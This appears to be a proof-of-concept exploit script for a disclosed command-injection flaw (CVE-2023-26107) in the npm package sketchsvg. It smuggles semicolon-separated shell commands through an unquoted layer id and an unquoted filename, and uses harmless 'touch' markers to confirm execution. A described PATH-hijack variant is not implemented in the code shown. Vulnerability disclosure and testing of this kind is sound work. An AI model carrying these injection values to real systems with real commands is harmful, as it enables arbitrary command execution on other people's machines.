/*
 * poc.js — Command Injection PoCs for sketchsvg@0.0.1
 * CVE-2023-26107 | CWE-78 | GHSA-6722-xvq8-3254
 *
 * Package entry point: index.js (CLI-only — no programmatic exports)
 *   index.js requires lib/index.js which exports the SketchSVG class
 *   lib/index.js runs shell.exec(`mdfind ...`) at module load time (line 21)
 *
 * NOTE: The entry point is a CLI wrapper that checks process.argv[2] for
 * a .sketch filepath and calls instance.init(). It does NOT export the
 * SketchSVG class. For vulns 1 and 2 we access the class from the internal
 * module (already loaded by the entry point) because crafting a valid
 * .sketch file with malicious layer IDs is outside the scope of this PoC.
 * Vuln 3 triggers entirely from require('sketchsvg') (the real entry point).
 *
 * ──────────────────────────────────────────────────────────────
 *
 * VULN 1 — runCmdLine (lib/index.js:115)
 *   Call chain: new SketchSVG() → runCmdLine(allLayers, fileName)
 *   Source:     allLayers.layers[i].id  (from a parsed .sketch file)
 *   Sink:       shell.exec(`... --item=${id} ...`)  — id is unquoted
 *   Constraint: allLayers must be { layers: [{ id, name }] }
 *
 * VULN 2 — getLayers (lib/index.js:64)
 *   Call chain: new SketchSVG() → getLayers(value)
 *   Source:     value parameter (filepath string from ParseSketch.init)
 *   Sink:       shell.exec(`${sketchTool} list layers ${value}`) — value unquoted
 *   Constraint: value is a string; JSON.parse on the result will throw
 *
 * VULN 3 — mdfind PATH hijack (lib/index.js:21)
 *   Call chain: require('sketchsvg') → require('./lib/index') → top-level shell.exec('mdfind ...')
 *   Source:     mdfind output (controlled via PATH environment variable)
 *   Sink:       sketchTool = `${whereIsSketch.trim()}/Contents/...`
 *               → used in every subsequent shell.exec call
 *   Constraint: a fake mdfind must be in PATH before the module is loaded
 *
 * ──────────────────────────────────────────────────────────────
 */

const fs   = require('fs');
const path = require('path');

// ─── Markers & helpers ──────────────────────────────────────

const MARKERS = {
  vuln1: '/tmp/sketchsvg_runcmdline',
  vuln2: '/tmp/sketchsvg_getlayers'
};

function cleanMarkers() {
  Object.values(MARKERS).forEach(m => {
    try { fs.unlinkSync(m); } catch (_) {}
  });
}

function checkMarker(label, marker) {
  if (fs.existsSync(marker)) {
    console.log('[+] ' + label + ' — Exploit confirmed');
    try { fs.unlinkSync(marker); } catch (_) {}
    return true;
  }
  console.log('[-] ' + label + ' — Exploit condition not verified');
  return false;
}

cleanMarkers();
const results = [];

// require('sketchsvg') → index.js → require('./lib/index')
// lib/index.js top-level: shell.exec('mdfind ...') picks up our fake script
require('sketchsvg');
const SketchSVG = require('sketchsvg/lib/index');

// ═════════════════════════════════════════════════════════════
// VULN 1 — runCmdLine: unquoted layer id (line 115)
//
// shell.exec(`... --item=${id} ...`)
//
// The semicolon in the layer id ends the --item= argument and
// starts a new shell command:  touch <marker>
// ═════════════════════════════════════════════════════════════

const inst1 = new SketchSVG();
const maliciousLayers = {
  layers: [{ id: 'x; touch ' + MARKERS.vuln1 + ';', name: 'test' }]
};
inst1.runCmdLine(maliciousLayers, '/tmp/fake.sketch');

results.push(checkMarker('Vuln 1 (runCmdLine layer id → line 115)', MARKERS.vuln1));

// ═════════════════════════════════════════════════════════════
// VULN 2 — getLayers: unquoted filename (line 64)
//
// shell.exec(`${sketchTool} list layers ${value}`)
//
// The semicolon in the filename ends the list-layers command
// and starts a new shell command:  touch <marker>
// ═════════════════════════════════════════════════════════════

const inst2 = new SketchSVG();
try {
  inst2.getLayers('/tmp/fake.sketch; touch ' + MARKERS.vuln2 + ';');
} catch (_) { /* JSON.parse fails — expected */ }

results.push(checkMarker('Vuln 2 (getLayers filename → line 64)', MARKERS.vuln2));

// ─── Final verdict ──────────────────────────────────────────

const passed = results.filter(Boolean).length;
console.log('\n' + passed + '/' + results.length + ' exploits confirmed');
process.exit(passed === results.length ? 0 : -1);
